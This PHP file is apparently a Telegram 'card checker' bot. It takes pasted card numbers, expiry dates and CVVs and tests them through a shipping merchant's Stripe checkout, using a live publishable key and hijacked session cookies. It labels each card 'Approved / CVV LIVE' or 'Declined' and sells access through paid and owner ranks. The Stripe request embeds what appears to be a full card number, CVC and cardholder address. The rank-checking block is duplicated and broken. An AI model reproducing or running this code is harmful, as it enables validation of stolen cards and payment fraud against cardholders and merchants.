<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }

//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/au|\.au|!au)/', $text)) {
    $userid = $update['message']['from']['id'];

    
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
  $message = substr($message, 4);
  $messageidtoedit1 = bot('sendmessage',[
      'chat_id'=>$chat_id,
      'text'=>"<b>Wait for Result...</b>",
      'parse_mode'=>'html',
      'reply_to_message_id'=> $message_id
  ]);
  $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

  $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
  $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
  $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
  $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
  $amt = '1';
  if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
      bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"• 𝘍𝘰𝘳𝘮𝘢𝘵𝘰 𝘪𝘯𝘤𝘰𝘳𝘳𝘦𝘤𝘵𝘰! \n •𝘜𝘚𝘖 <code>/au cc|mm|yy|cvv</code>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      return;
    };
  if(strlen($ano) == '4'){
      $an = substr($ano, 2);
  }
  else{
    $an = $ano;
  }
      $amount = $amt * 100;
  //------------Card info------------//
  $lista = ''.$cc.'|'.$mes.'|'.$an.'|'.$cvv.'';
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: lookup.binlist.net',
  'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
  $fim = curl_exec($ch);
  $bank = GetStr($fim, '"bank":{"name":"', '"');
  $name = strtoupper(GetStr($fim, '"name":"', '"'));
  $brand = strtoupper(GetStr($fim, '"brand":"', '"'));
  $country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
  $scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
  $emoji = GetStr($fim, '"emoji":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
          $bin = 'insufficient_funds';
          }else{
          $bin = 'Fail Try again';
          };        
     //IF BIN ARE NOT AVAILABLE ----//
      if (empty($scheme)) {
          $scheme = "N/A";
      }
      if (empty($type)) {
          $type = "N/A";
      }
      if (empty($brand)) {
          $brand = "N/A";
      }
      if (empty($bank)) {
          $bank = "N/A";
      }
      if (empty($name)) {
          $name = "N/A";
      }
      if (empty($emoji)) {
          $emoji = "N/A";
      }
      if (empty($currency)) {
          $currency = "N/A";
      }
  curl_close($ch);
  //------------Card info------------//
$r = "0";
 
$r = rand(0, 100);
  # -------------------- [1 REQ] -------------------#
  $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.luggagetoship.com/order/ax_charge_order_pay');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "order_id=92095");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Cookie: comm100_visitorguid_21799=2e0ddd86-cfd3-4ba6-aaba-196dd44c0ecd; ci_session=3047e0a734155c061ea6e3278dff95abd7bf56c7; __stripe_sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607; __stripe_mid=fd289972-6223-4864-938b-bc44fcc4faf6140118';
$headers[] = 'Origin: https://www.luggagetoship.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://www.luggagetoship.com/order/order_processing/92095';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Sec-Ch-Ua: ^^Not_A';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);



    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=697229&pasted_fields=number&guid=119a750e-9494-4efe-b137-e7a49987e99393b097&muid=fd289972-6223-4864-938b-bc44fcc4faf6140118&sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607&key=pk_live_vDBwegkvQzKsZsPgSnD40s6f&payment_user_agent=stripe.js^%^2F78ef418&card^[number^]=4381086424583789&card^[cvc^]=944&card^[exp_month^]=6&card^[exp_year^]=2027&card^[name^]=Halley+Swann&card^[address_line1^]=15+Driggs+Streets&card^[address_city^]=Driggs&card^[address_zip^]=84342&card^[address_state^]=&card^[address_country^]=AR");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: ^^Not_A';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $result2 = curl_exec($ch);
      $msg2 = Getstr($result2,'"message": "','"');

    $end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);
    ////////--[Responses]--////////

      if(strpos($result2, '"status": "succeeded"' )) {
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
━━━━━━━━━━━━━━━━           
[†] ᴄᴀʀᴅ <code>$lista</code>
[†] sᴛᴀᴛᴜs <code>Stripe Auth $1</code>
[†] ʀᴇsᴘᴏɴsᴇ <code> CVV LIVE </code>
━━━━━━━━━━━━━━━━
[†] 𝘽𝘼𝙉𝙆: <code>$bank $brand</code>
[†] 𝘽𝙧𝙖𝙣𝙙: <code>$scheme </code>
[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: <code>$name $emoji</code>
━━━━━━━━━━━━━━━━
[†] 𝗧𝗶𝗺𝗲 <code> $time seconds </code>
[†] 𝗣𝗿𝗼𝘅𝘆 <code>$r.XXX.XXX.XX </code>
[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz
  ",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      }
      elseif((empty($client)) || (empty($pi))) {
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
  ━━━━━━━━━━━━━━━━            
[†] ᴄᴀʀᴅ <code>$lista</code>
[†] sᴛᴀᴛᴜs Stripe Auth $1
[†] ʀᴇsᴘᴏɴsᴇ $msg 81724: Duplicate card exists in the vault. 
  ━━━━━━━━━━━━━━━━
[†] 𝘽𝘼𝙉𝙆: $bank
[†] 𝙏𝙮𝙥𝙚: $bin
[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: $name $emoji
  ━━━━━━━━━━━━━━━━
[†] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲  
[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬 <a href='t.me/hexnynejz'> 🅷🅴🆇🅽🆈🅽🅴🅲🅷🅺
  </a>━━━━━━━━━━━━━━━━
  ",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      }
      else {
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
━━━━━━━━━━━━━━━━      
[†] ᴄᴀʀᴅ <code>$lista</code>
[†] sᴛᴀᴛᴜs <code>Stripe Auth $1</code>
[†] ʀᴇsᴘᴏɴsᴇ <code>. $msg2 $bin </code>
━━━━━━━━━━━━━━━━
[†] 𝘽𝘼𝙉𝙆: <code>$bank $brand </code>
[†] 𝘽𝙧𝙖𝙣𝙙: <code>$scheme </code>
[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: <code>$name $emoji</code>
━━━━━━━━━━━━━━━━
[†] 𝗧𝗶𝗺𝗲 : <code>$time seconds </code>
[†] 𝗣𝗿𝗼𝘅𝘆: <code>$r.XXX.XXX.XX </code>
[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬 <a href='t.me/hexnynejz'> 🅷🅴🆇🅽🆈🅽🅴🅲🅷🅺 </a>
━━━━━━━━━━━━━━━━
  ",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      }
  }
  ?>
